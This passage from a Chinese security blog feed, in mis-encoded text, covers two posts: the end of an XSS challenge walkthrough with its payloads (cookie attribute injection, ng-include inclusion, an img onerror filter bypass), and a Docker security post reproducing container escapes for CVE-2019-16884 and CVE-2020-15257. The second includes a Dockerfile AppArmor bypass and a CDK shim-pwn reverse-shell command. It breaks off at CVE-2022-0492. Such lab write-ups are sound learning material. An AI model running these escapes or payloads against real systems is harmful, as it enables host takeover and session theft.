src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-13.png" class="" title="2024-02-29_13-13.png"><h6 id="-44"><a href="#-44" class="headerlink" title=""></a></h6><p>ç¬¬åä¸‰å…³<br>ä¸å…³å¡11ã€12ç±»ä¼¼ï¼Œä¿®æ”¹å€¼è¿›è¡Œç»•è¿‡ï¼Œä¹Ÿä¸å†å¤šè¯´</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-13_1.png" class="" title="2024-02-29_13-13_1.png"><h6 id="-45"><a href="#-45" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-14.png" class="" title="2024-02-29_13-14.png"><h6 id="-46"><a href="#-46" class="headerlink" title=""></a></h6><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">Cookie:</span> <span class="hljs-attr">user</span><span class="hljs-operator">=</span>click me!<span class="hljs-string">&quot; type=&quot;</span>button<span class="hljs-string">&quot; onclick=&quot;</span>alert(<span class="hljs-keyword">/xss/</span>)<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-16.png" class="" title="2024-02-29_13-16.png"><h6 id="-47"><a href="#-47" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-17.png" class="" title="2024-02-29_13-17.png"><h6 id="-48"><a href="#-48" class="headerlink" title=""></a></h6><p>ç¬¬åå››å…³<br>é¢â€¦ç¬¬åå››å…³å’‹å•¥ä¸œè¥¿ä¹Ÿæ²¡æœ‰ï¼Œå°±ä¸€ä¸ªè·³è½¬ï¼Œè¿˜æ˜¯404ï¼ï¼æºç ä¹Ÿæ²¡å•¥ä¸œè¥¿ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯è¦è€ƒå•¥ï¼Œæ£é¼“åŠå¤©æ”¾å¼ƒ..ç›´æ¥ä¸‹ä¸€é¢˜å§</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-19.png" class="" title="2024-02-29_13-19.png"><h6 id="-49"><a href="#-49" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-19_1.png" class="" title="2024-02-29_13-19_1.png"><h6 id="-50"><a href="#-50" class="headerlink" title=""></a></h6><p>ç¬¬åäº”å…³<br>åˆ†ææºç å‘ç°URLçš„srcå‚æ•°å›æ˜¾åœ¨ä¸‹é¢çš„ng-include</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-22_1.png" class="" title="2024-02-29_13-22_1.png"><h6 id="-51"><a href="#-51" class="headerlink" title=""></a></h6><p>ng-includeç›¸å½“äºphpçš„includeå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åŒ…å«ä¸€ä¸ªæœ‰XSSæ¼æ´çš„URLå°±å¯è§¦å‘è¿™é‡Œçš„XSSï¼Œé‚£æˆ‘ä»¬è¿™é‡ŒåŒ…å«ç¬¬ä¸€å…³çš„XSSè¯•è¯•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-24.png" class="" title="2024-02-29_13-24.png"><h6 id="-52"><a href="#-52" class="headerlink" title=""></a></h6><p>ç¬¬åå…­å…³<br>åœ¨urlä¸­è¾“å…¥æµ‹è¯•è¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°scriptè¢«è¿‡æ»¤äº†</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-24_1.png" class="" title="2024-02-29_13-24_1.png"><h6 id="-53"><a href="#-53" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°scriptè¢«è¿‡æ»¤äº†ã€å¹¶ä¸”ç©ºæ ¼å’Œ&#x2F;è¢«è½¬ä¹‰äº†</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-26.png" class="" title="2024-02-29_13-26.png"><h6 id="-54"><a href="#-54" class="headerlink" title=""></a></h6><p>ç”¨imgç»•è¿‡å¹¶ä¸”ç©ºæ ¼ç”¨%0aæ›¿æ¢</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?keyword<span class="hljs-operator">=</span>&lt;img<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>aonerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-27.png" class="" title="2024-02-29_13-27.png"><h6 id="-55"><a href="#-55" class="headerlink" title=""></a></h6><p>åˆ°äº†ä¸‹ä¸€å…³å‘ç°æç¤ºâ€œè¯¥æ’ä»¶ä¸æ”¯æŒâ€ï¼Œè¿™æ—¶å€™æˆ‘ç›²çŒœåº”è¯¥æ˜¯è€ƒFlash XSSï¼Œæ—¢ç„¶æç¤ºæˆ‘æ²¡æœ‰ä¸”åŠ è½½ä¸å‡ºæ¥ï¼Œé‚£å°±åˆ°æ­¤ä¸ºæ­¢å§ï¼Œä¹Ÿä¸çŸ¥é“åé¢æœ‰å¤šå°‘å…³ï¼Œæœ¬æ¥ä¸€å¼€å§‹å°±æ˜¯æ‰“ç€åšç€ç©çš„å¿ƒæ€ï¼Œæ‰“å‘ä¸€ä¸‹æ—¶é—´ï¼Œä¹Ÿå°±ä¸åœ¨è¿™ä¸Šé¢æµªè´¹æ—¶é—´äº†ï¼Œè¯´ä¸å®šå“ªå¤©åˆç¢°åˆ°äº†æˆ–è€…æƒ³èµ·æ¥äº†ï¼Œåˆ°æ—¶å€™å†ææç©å§ï¼å—¯å—¯..å°±è¿™æ ·</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-32.png" class="" title="2024-02-29_13-32.png"><h6 id="-56"><a href="#-56" class="headerlink" title=""></a></h6><p>ç»§ç»­åˆ·æˆ‘æŠ–éŸ³äº†ï½#$%@â€¦â€¦^&amp;*(-+)ğŸ˜Š</p>]]></content>
    
    
    <categories>
      
      <category>Game</category>
      
    </categories>
    
    
    <tags>
      
      <tag>game time</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dockerå®‰å…¨ï¼ˆäºŒï¼‰</title>
    <link href="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>ç»§ä¸Šä¸€ç¯‡ï¼Œåœ¨ï¼ˆä¸€ï¼‰ä¸­ï¼Œæ€»ç»“äº†å¸¸ç”¨çš„dockerç¯å¢ƒçš„åˆ¤æ–­å’Œä¿¡æ¯æ”¶é›†ï¼Œä»¥åŠå¸¸ç”¨çš„ä¸‰ç§é€ƒé€¸æ–¹å¼ï¼šPriviliged ç‰¹æƒæ¨¡å¼é€ƒé€¸ã€æŒ‚è½½å®¿ä¸»æœº procfs é€ƒé€¸ã€æŒ‚è½½ Docker Socket é€ƒé€¸ï¼Œæœ¬æ–‡å°†æ€»ç»“ä¸€äº›é€šè¿‡dockerè‡ªèº«æ¼æ´ä»¥åŠå®‰å…¨é…ç½®ä¸å½“é€ æˆçš„é€ƒé€¸æˆ–è€…å…¶ä»–æ¸—é€åˆ©ç”¨æ–¹å¼</p><h2 id="CVE-2019-16884"><a href="#CVE-2019-16884" class="headerlink" title="CVE-2019-16884"></a>CVE-2019-16884</h2><p>æ”»å‡»è€…å¯ä»¥åœ¨å®¹å™¨é•œåƒä¸­å¯ä»¥å£°æ˜ä¸€ä¸ªVOLUMEå¹¶æŒ‚è½½è‡³&#x2F;procï¼Œä¹‹åæ¬ºéª—runcä½¿å…¶è®¤ä¸ºAppArmorå·²ç»æˆåŠŸåº”ç”¨ä»è€Œç»•è¿‡AppArmorç­–ç•¥<br>ï¼ˆruncæ˜¯ä¸€ä¸ªæ ¹æ®OCIè§„èŒƒå®ç°çš„CLIå·¥å…·ï¼Œç”¨äºç”Ÿæˆå’Œè¿è¡Œå®¹å™¨ï¼Œdockerçš„runtimeä½¿ç”¨çš„å°±æ˜¯runcï¼‰</p><p>å½±å“ç‰ˆæœ¬ï¼šrunc &lt;&#x3D; 1.0.0-rc8</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-15_11-47.png" class="" title="2024-02-15_11-47.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h3 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h3><p>é¦–å…ˆåˆ›å»ºapparmorè§„åˆ™</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;tunables/global&gt;</span><br><br>profile no_flag flags=(attach_disconnected,mediate_deleted) &#123;<br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;abstractions/base&gt;</span><br>  file,<br>  deny /<span class="hljs-built_in">flag</span> r,<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆæ³¨ï¼šå¦‚æœdockerç¯å¢ƒä¸­ä¸èƒ½ä½¿ç”¨vim,å¯ä»¥ä½¿ç”¨cat+EOFï¼‰<br>éšååˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œä»¥è¯å®é€ƒé€¸æ˜¯å¦æˆåŠŸ</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-15_11-49.png" class="" title="2024-02-15_11-49.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>å†å¯¹åˆšæ‰åˆ›å»ºçš„è§„åˆ™è¿›è¡Œåº”ç”¨</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/sbin/apparmor_parser</span> <span class="hljs-params">--replace</span> <span class="hljs-params">--write-cache</span> <span class="hljs-string">/etc/apparmor.d/no_flag</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªæ­£å¸¸é•œåƒå¹¶å°è¯•è¯»å–flagæ˜¯æŠ¥é”™çš„ï¼Œä¼šæç¤ºæ— æƒé™è¯»å–flagå†…å®¹ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ¼æ´å¯åŠ¨ä¸€ä¸ªæ¶æ„é•œåƒï¼Œæ¥è¯»å–flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p rootfs/proc/self/&#123;attr,fd&#125;<br><span class="hljs-built_in">touch</span> rootfs/proc/self/&#123;status,attr/exec&#125;<br><span class="hljs-built_in">touch</span> rootfs/proc/self/fd/&#123;4,5&#125;<br><br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF &gt; Dockerfile</span><br><span class="hljs-string">FROM busybox</span><br><span class="hljs-string">ADD rootfs /</span><br><span class="hljs-string"></span><br><span class="hljs-string">VOLUME /proc</span><br><span class="hljs-string">EOF</span><br><br>docker build -t apparmor-bypass .<br>docker run --<span class="hljs-built_in">rm</span> --security-opt <span class="hljs-string">&quot;apparmor=no_flag&quot;</span> -v /tmp/flag:/flag apparmor-bypass <span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>é€ƒé€¸æˆåŠŸï¼Œå¹¶æˆåŠŸè¯»å–å®¿ä¸»æœºæ–‡ä»¶</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_11-03.png" class="" title="2024-02-16_11-03.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h2 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h2><p>containerdæ˜¯è¡Œä¸šæ ‡å‡†çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œå¯ä½œä¸ºLinuxå’ŒWindowsçš„å®ˆæŠ¤ç¨‹åºä½¿ç”¨ã€‚åœ¨ç‰ˆæœ¬1.3.9å’Œ1.4.3ä¹‹å‰çš„å®¹å™¨ä¸­ï¼Œå®¹å™¨å¡«å……çš„APIä¸æ­£ç¡®åœ°æš´éœ²ç»™ä¸»æœºç½‘ç»œå®¹å™¨ã€‚å¡«å……ç¨‹åºçš„APIå¥—æ¥å­—çš„è®¿é—®æ§åˆ¶éªŒè¯äº†è¿æ¥è¿‡ç¨‹çš„æœ‰æ•ˆUIDä¸º0ï¼Œä½†æ²¡æœ‰ä»¥å…¶ä»–æ–¹å¼é™åˆ¶å¯¹æŠ½è±¡UnixåŸŸå¥—æ¥å­—çš„è®¿é—®ã€‚è¿™å°†å…è®¸åœ¨ä¸å¡«å……ç¨‹åºç›¸åŒçš„ç½‘ç»œåç§°ç©ºé—´ä¸­è¿è¡Œçš„æ¶æ„å®¹å™¨ï¼ˆæœ‰æ•ˆUIDä¸º0ï¼Œä½†ç‰¹æƒé™ä½ï¼‰å¯¼è‡´æ–°è¿›ç¨‹ä»¥æå‡çš„ç‰¹æƒè¿è¡Œï¼Œæ€»ç»“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œä»è€Œçªç ´å®¹å™¨å‘½åç©ºé—´éš”ç¦»ï¼Œå®ç°å®¹å™¨é€ƒé€¸</p><p>å½±å“ç‰ˆæœ¬ï¼šcontainerd &lt; 1.4.3ã€containerd &lt; 1.3.9</p><h3 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h3><p>containerd-shimï¼š<br>å¤¹æ‚åœ¨containerdå’Œruncä¹‹é—´ï¼Œæ¯æ¬¡å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„containerd-shimè¿›ç¨‹ï¼Œå®ƒé€šè¿‡æŒ‡å®šçš„ä¸‰ä¸ªå‚æ•°ï¼šå®¹å™¨idã€bundleç›®å½•ã€è¿è¡Œæ—¶äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œæ¥è°ƒç”¨è¿è¡Œæ—¶çš„APIåˆ›å»ºã€è¿è¡Œå®¹å™¨ï¼ŒæŒç»­å­˜åœ¨åˆ°å®¹å™¨å®ä¾‹è¿›ç¨‹é€€å‡ºä¸ºæ­¢ï¼Œå°†å®¹å™¨çš„é€€å‡ºçŠ¶æ€åé¦ˆç»™containerd</p><p>Unixå¥—æ¥å­—ï¼š<br>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œæœ‰ä¸€ç§UnixåŸŸå¥—æ¥å­—ï¼Œå¯ä»¥ç”¨äºåŒä¸€ä¸ªä¸»æœºä¸Šçš„è¿›ç¨‹ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œå®ƒçš„APIè°ƒç”¨æ–¹æ³•å’Œæ™®é€šçš„TCP&#x2F;IPçš„å¥—æ¥å­—ä¸€æ ·ï¼Œä¹Ÿæ˜¯è°ƒç”¨socketå‡½æ•°åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼ŒåŸŸè®¾ç½®æˆAF_UNIXï¼Œå¥—æ¥å­—çš„ç±»å‹å¯ä»¥æ˜¯æµå¥—æ¥å­—ï¼ˆSOCK_STREAMï¼‰å’Œæ•°æ®æŠ¥å¥—æ¥å­—ï¼ˆSOCK_DGRAMï¼‰</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">UnixåŸŸæµå¥—æ¥å­—ï¼š<br><span class="hljs-built_in">socket</span>(AF_UNIX,  SOCK_STREAM, <span class="hljs-number">0</span>);<br>UnixåŸŸæ•°æ®æŠ¥å¥—æ¥å­—ï¼š<br><span class="hljs-built_in">socket</span>(AF_UNIX,SOCK_DGRAM,  <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>dockerç½‘ç»œæ¨¡å¼ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ï¼ˆ<span class="hljs-number">1</span>ï¼‰noneï¼šè¿™ç§æ¨¡å¼ä¸‹å®¹å™¨å†…éƒ¨åªæœ‰loopbackå›ç¯ç½‘ç»œï¼Œæ²¡æœ‰å…¶ä»–ç½‘å¡ï¼Œä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œå®Œå…¨å°é—­çš„ç½‘ç»œï¼›<br>ï¼ˆ<span class="hljs-number">2</span>ï¼‰containerï¼šæŒ‡å®šä¸€ä¸ªå·²ç»å­˜åœ¨çš„å®¹å™¨åå­—ï¼Œæ–°çš„å®¹å™¨ä¼šå’Œè¿™ä¸ªå·²ç»å­˜åœ¨çš„å®¹å™¨å…±äº«ä¸€ä¸ªç½‘ç»œå‘½åç©ºé—´ï¼Œ<span class="hljs-built_in">IP</span>ã€ç«¯å£èŒƒå›´ä¹Ÿä¸€èµ·åœ¨è¿™ä¸¤ä¸ªå®¹å™¨ä¸­å…±äº«ï¼›<br>ï¼ˆ<span class="hljs-number">3</span>ï¼‰bridgeï¼šè¿™æ˜¯dockeré»˜è®¤çš„ç½‘ç»œæ¨¡å¼ï¼Œä¼šä¸ºæ¯ä¸€ä¸ªå®¹å™¨åˆ†é…ç½‘ç»œå‘½åç©ºé—´ï¼Œè®¾ç½®<span class="hljs-built_in">IP</span>ï¼Œä¿è¯å®¹å™¨å†…çš„è¿›ç¨‹ä½¿ç”¨ç‹¬ç«‹çš„ç½‘ç»œç¯å¢ƒï¼Œä½¿å¾—å®¹å™¨å’Œå®¹å™¨ä¹‹é—´ã€å®¹å™¨å’Œä¸»æœºä¹‹é—´å®ç°ç½‘ç»œéš”ç¦»ï¼›<br>ï¼ˆ<span class="hljs-number">4</span>ï¼‰hostï¼šè¿™ç§æ¨¡å¼ä¸‹ï¼Œå®¹å™¨å’Œä¸»æœºå·²ç»æ²¡æœ‰ç½‘ç»œéš”ç¦»äº†ï¼Œå®ƒä»¬å…±äº«åŒä¸€ä¸ªç½‘ç»œå‘½åç©ºé—´ï¼Œå®¹å™¨çš„ç½‘ç»œé…ç½®å’Œä¸»æœºå®Œå…¨ä¸€æ ·ï¼Œä½¿ç”¨ä¸»æœºçš„<span class="hljs-built_in">IP</span>åœ°å€å’Œç«¯å£ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°ä¸»æœºæ‰€æœ‰ç½‘å¡ä¿¡æ¯ã€ç½‘ç»œèµ„æºï¼Œåœ¨ç½‘ç»œæ€§èƒ½ä¸Šæ²¡æœ‰æŸè€—ã€‚ä½†ä¹Ÿæ­£æ˜¯å› ä¸ºæ²¡æœ‰ç½‘ç»œéš”ç¦»ï¼Œå®¹å™¨å’Œä¸»æœºå®¹æ˜“äº§ç”Ÿç½‘ç»œèµ„æºå†²çªã€äº‰æŠ¢ï¼Œä»¥åŠå…¶ä»–çš„ä¸€äº›é—®é¢˜å®‰å…¨éšæ‚£é—®é¢˜<br></code></pre></td></tr></table></figure><p>(åœ¨ä½¿ç”¨docker runå‘½ä»¤åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨â€“networké€‰é¡¹æŒ‡å®šå®¹å™¨çš„ç½‘ç»œæ¨¡å¼)</p><p>æ¯æ¬¡å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ—¶ï¼Œcontainerdä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„containerd-shimè¿›ç¨‹ï¼Œç”±containerd-shimè¿›ç¨‹ï¼ˆè€Œä¸æ˜¯containerdï¼‰æ¥ç›´æ¥æ§åˆ¶å®¹å™¨çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œè€Œcontainerdåœ¨åˆ›å»ºcontainerd-shimä¹‹å‰ï¼Œä¼šåˆ›å»ºä¸€ä¸ªUnixåŸŸå¥—æ¥å­—ï¼Œcontainerdä¼ é€’UnixåŸŸå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ç»™containerd-shimã€‚containerd-shimåœ¨æ­£å¼å¯åŠ¨ä¹‹åï¼Œä¼šåŸºäºçˆ¶è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯containerdï¼‰ä¼ é€’çš„UnixåŸŸå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ï¼Œå»ºç«‹gRPCæœåŠ¡ï¼Œå¯¹å¤–æš´éœ²ä¸€äº›APIç”¨äºcontainerã€taskçš„æ§åˆ¶ï¼Œæ­¤æ—¶ï¼Œcontainerd-shimåšä¸ºserverå‘å¤–æä¾›æœåŠ¡ï¼Œcontainerdåšä¸ºclientï¼Œè°ƒç”¨containerd-shimæä¾›çš„APIå®ç°å¯¹å®¹å™¨çš„é—´æ¥ç®¡ç†ï¼Œè€ŒæŠ½è±¡UnixåŸŸå¥—æ¥å­—æ²¡æœ‰æƒé™é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½é è¿æ¥è¿›ç¨‹çš„UIDã€GIDåšè®¿é—®æ§åˆ¶ï¼Œé™å®šäº†åªèƒ½æ˜¯rootï¼ˆUID&#x3D;0ï¼ŒGID&#x3D;0ï¼‰ç”¨æˆ·æ‰èƒ½è¿æ¥æˆåŠŸã€‚é€šè¿‡è®¿é—®&#x2F;proc&#x2F;net&#x2F;unixæ–‡ä»¶ï¼Œå¯ä»¥è·å–åˆ°å½“å‰ç½‘ç»œå‘½åç©ºé—´ä¸‹æ‰€æœ‰çš„UnixåŸŸå¥—æ¥å­—ä¿¡æ¯ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker runå¯åŠ¨çš„å®¹å™¨çš„ç½‘ç»œæ¨¡å¼æ˜¯bridgeï¼Œå®¹å™¨å’Œä¸»æœºä¹‹é—´å®ç°äº†ç½‘ç»œéš”ç¦»ï¼Œæ‰€ä»¥åœ¨å®¹å™¨å†…éƒ¨è¯»å–&#x2F;proc&#x2F;net&#x2F;unixæ–‡ä»¶ï¼Œçœ‹ä¸åˆ°ä»»ä½•ä¿¡æ¯</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-05.png" class="" title="2024-02-17_09-05.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>ä½†æ˜¯åœ¨hostæ¨¡å¼ä¸‹ï¼Œç”±äºå®¹å™¨å’Œä¸»æœºå…±äº«åŒä¸€ä¸ªç½‘ç»œå‘½åç©ºé—´ï¼Œå®¹å™¨èƒ½è®¿é—®åˆ°ä¸»æœºä¸­çš„æ‰€æœ‰ç½‘ç»œèµ„æºï¼Œæ‰€ä»¥åœ¨å®¹å™¨å†…éƒ¨è¯»å–&#x2F;proc&#x2F;net&#x2F;unixæ–‡ä»¶ï¼Œæ˜¾ç¤ºçš„å°±æ˜¯çœŸå®ä¸»æœºä¸­çš„ä¿¡æ¯</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-05_1.png" class="" title="2024-02-17_09-05_1.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_15-24.png" class="" title="2024-02-16_15-24.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>é¦–å…ˆä¸‹è½½å®¹å™¨ï¼Œå¹¶ä½¿ç”¨hostç½‘ç»œæ¨¡å¼å¯åŠ¨ï¼Œè¿›å…¥dockerä¹‹åè¿›è¡Œè®°ä¸‹idå·ï¼Œåé¢ä¼šç”¨åˆ°</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_16-18.png" class="" title="2024-02-16_16-18.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥å°±è¦æ¬å‡ºæˆ‘ä»¬å¤§åé¼é¼çš„CDKï¼Œä¸€æ¬¾ä¸“é—¨ä¸ºK8sã€Docker å’Œ Containerd æ‰“é€ çš„çš„å®‰å…¨æµ‹è¯•ï¼ˆ<a href="https://github.com/cdk-team/CDK%EF%BC%89">https://github.com/cdk-team/CDKï¼‰</a><br>è¿™é‡Œæˆ‘ä»¬å°†ä¸‹è½½å¥½çš„å‹ç¼©åŒ…è§£å‹ï¼Œç„¶åç›´æ¥copy idå·ï¼Œå°†å·¥å…·ä¼ å…¥åˆ°dockerå®¹å™¨</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_16-32.png" class="" title="2024-02-16_16-32.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>è¿›å…¥å®¹å™¨ï¼Œåœ¨å®¹å™¨å†…æ‰§è¡Œexpï¼ŒåŒæ—¶æ”»å‡»æœºè®¾ç½®ç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it <span class="hljs-built_in">id</span>å· /bin/bash<br>./cdk_linux_amd64 run shim-pwn 127.0.0.1 9999<br></code></pre></td></tr></table></figure><p>æˆåŠŸå®Œæˆé€ƒé€¸è·å¾—å®¿ä¸»æœºçš„shell</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_17-43.png" class="" title="2024-02-16_17-43.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><h2 id="CVE-2022-0492"><a href="#CVE-2022-0492" class="headerlink" title="CVE-2022-0492"></a>CVE-2022-0492</h2><p>æ¼æ´å‘ç”Ÿçš„ç‚¹åœ¨äºå¯¹ä¿®æ”¹cgroup çš„release_agentç¼ºå¤±æƒé™æ ¡éªŒï¼Œå¯¼è‡´ç»™é€ƒé€¸åˆ©ç”¨çš„é—¨æ§›è¿›ä¸€æ­¥é™ä½(ä»¥å‰éœ€è¦CAP_SYS_ADMINæƒé™ï¼Œè¯¥æ¼æ´æ— 